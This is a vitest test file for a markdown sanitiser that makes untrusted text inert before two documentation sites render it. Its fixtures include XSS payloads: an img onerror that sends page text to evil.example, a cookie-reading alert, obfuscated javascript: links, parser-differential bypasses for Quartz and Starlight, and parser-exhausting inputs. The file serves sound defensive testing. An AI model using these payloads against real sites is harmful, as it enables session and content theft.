import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { inertMarkdown, unsafeMarkup, Vault } from "@scriptorium/core";
import { fileGapNote, organizeInboxFile } from "@scriptorium/curator";
import { lintDoc, publishDoc } from "@scriptorium/scribe";

/**
 * The vault is published as two sites that render raw HTML and any link scheme. Text nobody
 * vouched for (a typed question, an attached PRD, a model's draft) is written inert.
 */
const HOSTILE = `What is the SSO SLA? <img src=x onerror="fetch('//evil.example/?'+document.body.innerText)"> [our policy](javascript:alert(1))`;

describe("inert markdown", () => {
  it("a tag can't open and a non-web link loses its target; code, web links and prose stay", () => {
    const out = inertMarkdown(HOSTILE);
    expect(out).not.toMatch(/<img|\]\(javascript:/i);
    expect(out).toContain("&lt;img");
    const kept = "Press `<kbd>Ctrl</kbd>`, see [the guide](https://docs.beacon.example) or <https://x.example>, mail [us](mailto:a@b.example), a < b.\n```html\n<script>keep()</script>\n```";
    expect(inertMarkdown(kept)).toBe(kept);
  });

  it("parses as the sites do: a code span across a line hides nothing, and code anywhere is left as written", () => {
    // Line by line, the second backtick looked like a one-line span and the <img> stayed live.
    const bypass = "Is SSO supported? `\n` <img src=x onerror=alert(document.cookie)> `";
    expect(inertMarkdown(bypass)).not.toContain("<img");
    // Example HTML in an indented fence (a list step), in indented code and in a double-backtick
    // span is code: untouched, and lint doesn't object. An email autolink stays a link.
    for (const normal of [
      '1. Embed it:\n\n   ```html\n   <iframe src="https://x"></iframe>\n   ```\n2. Done.',
      "Intro.\n\n    <script>indented()</script>",
      "``a `<b>` c`` and <support@beacon.example> and <https://x.example>",
    ]) {
      expect(inertMarkdown(normal), normal).toBe(normal);
      expect(unsafeMarkup(normal), normal).toEqual({ html: [], links: [] });
    }
    // Every shape of a non-web target loses it: inline, autolink (kept as text), definition.
    const links = "[p](javascript:alert(1)) <javascript:alert(2)>\n\n[d]: javascript:evil()";
    expect(inertMarkdown(links)).toBe("[p](#unsafe-link-removed) &lt;javascript:alert(2)>\n\n[d]: #unsafe-link-removed");
  });

  it("parses tables as the sites do: a row is split into cells before code spans are read", () => {
    // CommonMark reads one code span from the first backtick to the last; GFM (Quartz,
    // Starlight) splits the row at `|` first, and the <img> between them is live.
    const row = "| a | b |\n|---|---|\n| `x | <img src=x onerror=alert(1)> ` | y |";
    expect(inertMarkdown(row)).toBe("| a | b |\n|---|---|\n| `x | &lt;img src=x onerror=alert(1)> ` | y |");
    const kept = "| Key | Example |\n|---|---|\n| `Ctrl` | `<kbd>` |\n\n~~old~~ www.beacon.example and [^1]\n\n[^1]: A note.\n\n- [x] done";
    expect(inertMarkdown(kept)).toBe(kept);
  });

  it("a target is read as the browser reads it, wherever the title puts its own scheme", () => {
    for (const hostile of [
      '[x](javascript:alert(1) "javascript:")',
      "[x](java&#115;cript:alert(1))",
      "[x](javascript&colon;alert(1))",
      "[x](javascript\\:alert(1))",
      "[x](<java\tscript:alert(1)>)",
      "[x](< javascript:alert(1)>)",
      "![i](data:text/html,x)",
    ]) {
      const out = inertMarkdown(hostile);
      expect(out, hostile).toContain("#unsafe-link-removed");
      expect(unsafeMarkup(out), hostile).toEqual({ html: [], links: [] });
    }
    expect(inertMarkdown('[x](javascript:alert(1) "javascript:")')).toBe('[x](#unsafe-link-removed "javascript:")');
    // Many at once, each found by both readings: all removed in one pass, not kept as code.
    const many = Array.from({ length: 6 }, (_, n) => `[l${n}](javascript:alert(${n}))`).join(" ");
    expect(inertMarkdown(many)).toBe(Array.from({ length: 6 }, (_, n) => `[l${n}](#unsafe-link-removed)`).join(" "));
  });

  it("a leading byte-order mark doesn't shift where a link target is read from", () => {
    // micromark counts from after the mark: the target was read from its `(`, with no scheme.
    expect(inertMarkdown("﻿See [x](javascript:alert(1)).")).toBe("﻿See [x](#unsafe-link-removed).");
    expect(unsafeMarkup("﻿[x](javascript:alert(1))").links).toEqual(["javascript:"]);
  });

  it("what Quartz would write back out as HTML is broken where it starts, and nothing else changes", () => {
    const Z = "​";
    const fence = "```";
    const cases: Array<[string, string]> = [
      // ==…== is written into a <span> from the decoded text: the &lt; inert wrote was a tag again.
      ["==<script>alert(1)</script>==", `=${Z}=&lt;script>alert(1)&lt;/script>==`],
      // A transclusion's alias goes into an attribute.
      ['![[docs/x|"><script>alert(1)</script>]]', `![${Z}[docs/x|">&lt;script>alert(1)&lt;/script>]]`],
      // %%…%% is cut from the raw text, code included, before parsing.
      ["<%%x%%img src=x onerror=alert(1)>", `<%${Z}%x%${Z}%img src=x onerror=alert(1)>`],
      [`%%\n${fence}\n%%<img src=x onerror=alert(1)>\n${fence}`, `%${Z}%\n${fence}\n%${Z}%<img src=x onerror=alert(1)>\n${fence}`],
      // An external wikilink is rewritten into markdown before parsing; this one, a video embed.
      ['![[https://x.example/"onerror="alert(1)//.mp4|a]]', `![${Z}[https://x.example/"onerror="alert(1)//.mp4|a]]`],
      ["[[https://x.example/page|a]]", `[${Z}[https://x.example/page|a]]`],
      // A video's URL goes into src="…".
      ['![v](https://x.example/a"onerror="alert(1).mp4)', "![v](#unsafe-link-removed)"],
      // In a table, the wikilink's | is escaped first, which joins two cells and moves a code span.
      ["| a | b |\n|---|---|\n| `x [[n|m]] | <img src=x onerror=alert(1)> ` | y |", "| a | b |\n|---|---|\n| `x [[n\\|m]] | &lt;img src=x onerror=alert(1)> ` | y |"],
      // Mermaid runs loose: a click can follow javascript:. It is shown as code instead.
      [`${fence}mermaid\ngraph TD\nclick A href "javascript:alert(1)"\n${fence}`, `${fence}text\ngraph TD\nclick A href "javascript:alert(1)"\n${fence}`],
    ];
    for (const [hostile, expected] of cases) {
      expect(inertMarkdown(hostile), hostile).toBe(expected);
      expect(inertMarkdown(expected), hostile).toBe(expected);
    }
    for (const kept of ["==important== and a < b", "[[docs/x|The X page]] and ![[docs/y]]", "100%% sure", `${fence}js\nif (a == b && c<d) {}\n${fence}`, `${fence}mermaid\ngraph TD\nA-->B\n${fence}`]) {
      expect(inertMarkdown(kept), kept).toBe(kept);
    }
  });

  it("reads as Quartz reads it with math, too: unsafe in either reading is unsafe", () => {
    // To GFM a code span hides the tag; Quartz's `$…$` math takes the first backtick, and the tag is live.
    expect(inertMarkdown("$`$ <img src=x onerror=alert(1)> `")).toBe("$`$ &lt;img src=x onerror=alert(1)> `");
    const prose = "Price is $5 and `code <b>` and $x^2$";
    expect(inertMarkdown(prose)).toBe(prose);
  });

  it("reads as Starlight reads it, with its `:::` asides: a container can end inside a fence", () => {
    // To GFM the fence holds the tag; a directive container closes at its `:::`, and the tag
    // after it is live HTML.
    const fence = "```";
    expect(inertMarkdown(`:::note\n${fence}\n:::\n<img src=x onerror=alert(1)>\n${fence}`)).toBe(`:::note\n${fence}\n:::\n&lt;img src=x onerror=alert(1)>\n${fence}`);
  });

  it("a code block kept whole stays whole after Quartz cuts its comments", () => {
    // Too costly to parse, so kept as code; Quartz then cut "%%x%%" from the raw text, which
    // joined two runs of three into a fence of six that closed a fence of four.
    const hostile = `${"[a]".repeat(501)}\n\`\`\`%%x%%\`\`\`\n<img src=x onerror=alert(1)>`;
    const kept = inertMarkdown(hostile);
    const asQuartzReadsIt = kept.replace(/%%[\s\S]*?%%/g, "");
    expect(asQuartzReadsIt).toBe(kept);
    expect(/^(`{3,})\n[\s\S]*\n\1\n$/.test(kept)).toBe(true);
    expect(inertMarkdown(kept)).toBe(kept);
    // Text that arrives looking like one kept block is taken as one only if Quartz can't cut it open.
    // (Over the limit for code too: 2,002 brackets.)
    const looksKept = `\`\`\`\`\n${"[a]".repeat(1001)}\n\`\`\`%%x%%\`\`\`\n<img src=x onerror=alert(1)>\n\`\`\`\`\n`;
    const rekept = inertMarkdown(looksKept);
    expect(rekept.replace(/%%[\s\S]*?%%/g, "")).toBe(rekept);
  });

  it("runs again until nothing is left, and a second run changes nothing", () => {
    // Escaped, an HTML block is a paragraph, and its link is live. A backtick inside an
    // escaped tag pairs with the one that kept a tag inside code.
    for (const hostile of ["<div>\n[x](javascript:alert(1))\n</div>", '<a title="`">`<a title="`">`<img src=x onerror=alert(1)>`']) {
      const out = inertMarkdown(hostile);
      expect(out, hostile).not.toMatch(/^```/);
      expect(unsafeMarkup(out), hostile).toEqual({ html: [], links: [] });
      expect(inertMarkdown(out), hostile).toBe(out);
    }
    // A chain longer than the passes allow is kept whole as code, where nothing renders.
    const chain = '<a title="`">`<a title="`">`<a title="`">`<img src=x onerror=alert(1)>`';
    const kept = inertMarkdown(chain);
    expect(kept).toBe(`\`\`\`\n${chain}\n\`\`\`\n`);
    expect(unsafeMarkup(kept)).toEqual({ html: [], links: [] });
  });

  it("a shape too costly to parse is kept as code, unparsed", () => {
    // micromark takes seconds over these, on the one process (`- - - …` 25,000 long: 9 s).
    const paragraphWithSteps = `${"*_".repeat(400)}\n` + Array.from({ length: 3 }, () => `2. ${"*_".repeat(400)}`).join("\n");
    const blocks = (block: string, count: number) => Array.from({ length: count }, () => block).join("\n\n");
    for (const costly of [
      "x".repeat(1_000_001),
      `${"> ".repeat(21)}x`,
      `${"- ".repeat(25_000)}x`,
      `${" ".repeat(70)}- x`,
      "> x\n\n".repeat(3_001), // a blank line ends a quote: each is a new one
      "- > a\n".repeat(3_001), // a new item closes the quote inside the last one
      blocks("*_".repeat(450), 60), // 54,000 in all, each paragraph under the limit
      blocks("[a]".repeat(450), 120),
      `${"*_".repeat(501)}a`,
      "~~a".repeat(501),
      "[a](".repeat(501),
      paragraphWithSteps, // a `2.` line continues a paragraph, so its count does too
      "````\n" + "- ".repeat(30),
      // Lines ended by a lone CR, as micromark ends them too.
      `x\r${"- ".repeat(25_000)}`,
      "> a\r\r".repeat(3_001),
      // Code to a line counter, but a fence inside an HTML block opens nothing: still counted.
      "<div>\n```\n\n" + "*_".repeat(1_001),
    ]) {
      const out = inertMarkdown(costly);
      expect(/^(`{3,})\n[\s\S]*\n\1\n$/.test(out), costly.slice(0, 20)).toBe(true);
      expect(inertMarkdown(out)).toBe(out);
      expect(unsafeMarkup(costly).tooCostly, costly.slice(0, 20)).toBeTruthy();
    }
    expect(lintDoc(`# T\n\n## Overview\n\n${"- ".repeat(30)}x\n\n## Steps\n\n1. Go.`).map((finding) => finding.code)).toContain("too-costly");
  });

  it("a long page gets fewer passes, so it costs no more to parse than a short one", () => {
    const chained = "<div>\n[x](javascript:alert(1))\n</div>";
    expect(inertMarkdown(chained)).toBe("&lt;div>\n[x](#unsafe-link-removed)\n&lt;/div>");
    const long = `${"word ".repeat(120_000)}\n\n${chained}`;
    expect(inertMarkdown(long)).toMatch(/^```\n/);
  });

  it("long pages, lists and code samples are not costly shapes", () => {
    const json = "```json\n" + Array.from({ length: 600 }, (_, i) => `[${i}],`).join("\n") + "\n```";
    const psql = "```\n" + "-".repeat(60) + "+" + "-".repeat(60) + "\n```";
    const snake = "```python\n" + Array.from({ length: 800 }, () => "user_id = load_user(org_id)").join("\n") + "\n```";
    const list = Array.from({ length: 1_500 }, (_, i) => `- Item ${i} is **bold** with [a link](https://x.example/${i})`).join("\n");
    const steps = Array.from({ length: 200 }, (_, i) => `${i + 1}. Step **${i}** in [the docs](https://x.example)`).join("\n");
    const index = Array.from({ length: 15_000 }, (_, i) => `- [[docs/feature-${i}|Feature ${i}]]`).join("\n");
    const quote = Array.from({ length: 5_000 }, (_, i) => `> line ${i}`).join("\n");
    const wrapped = Array.from({ length: 1_500 }, (_, i) => `- Item ${i} that is long\n  and wraps`).join("\n");
    for (const normal of [`# Rules\n\n${"-".repeat(120)}\n\n${" ".repeat(120)}\n\nText.`, json, psql, snake, list, steps, index, quote, wrapped]) {
      expect(unsafeMarkup(normal).tooCostly, normal.slice(0, 30)).toBeUndefined();
      expect(inertMarkdown(normal), normal.slice(0, 30)).toBe(normal);
    }
  });

  it("lint sends back a draft with raw HTML or a link that doesn't go to the web", () => {
    const codes = lintDoc(`# T\n\n## Overview\n\n${HOSTILE}\n\n## Steps\n\n1. Go.`).map((finding) => finding.code);
    expect(codes).toContain("raw-html");
    expect(codes).toContain("unsafe-link");
    expect(lintDoc("# T\n\n## Overview\n\nUse `<b>` for bold; x<y.\n\n## Steps\n\n1. See [docs](https://x.example).").map((finding) => finding.code)).toEqual([]);
  });

  it("a gap note, a filed PRD and a published doc reach the vault inert", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "scriptorium-inert-"));
    const vault = new Vault(root);
    await vault.ensure();
    const auditFile = path.join(root, "audit.jsonl");
    const gap = await fileGapNote(vault, { question: HOSTILE, missing: "SSO <script>x</script>", askedBy: "U1", auditFile });
    // Code on its own, live HTML once quoted: the note is made inert as the site reads it, whole.
    const tabbed = await fileGapNote(vault, { question: "\t<img src=x onerror=alert(1)>", missing: "SSO", askedBy: "U2", auditFile });
    // Alone, a fence whose info string is the tag; after "Missing documentation:", a live tag.
    const fence = await fileGapNote(vault, { question: "Is SCIM supported?", missing: "``` <img src=x onerror=alert(1)>", askedBy: "U3", auditFile });
    await vault.writeNote("_inbox/sso.md", `# SSO\n\n## Requirements\n\n${HOSTILE}`, { kind: "prd", feature: "SSO" });
    const filed = await organizeInboxFile(vault, "_inbox/sso.md");
    const doc = await publishDoc({ vault, auditFile, repoRoot: root, markdown: `# SSO\n\n${HOSTILE}`, approvedBy: "PM", slug: "sso" });
    for (const relPath of [gap.relPath, tabbed.relPath, fence.relPath, filed.to as string, doc]) {
      const raw = await fs.readFile(vault.abs(relPath), "utf8");
      expect(raw, relPath).not.toMatch(/<img|<script|\]\(javascript:/i);
    }
    await fs.rm(root, { recursive: true, force: true, maxRetries: 5 });
  });
});
